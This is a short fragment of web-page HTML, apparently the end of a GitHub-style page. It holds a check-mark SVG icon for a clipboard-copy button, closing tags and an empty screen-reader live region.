      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




  


<div aria-live="polite" class="sr-only"></div></body></html>
